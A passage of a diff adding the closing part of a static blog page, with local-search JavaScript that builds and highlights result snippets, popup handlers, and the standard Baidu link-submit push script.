+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
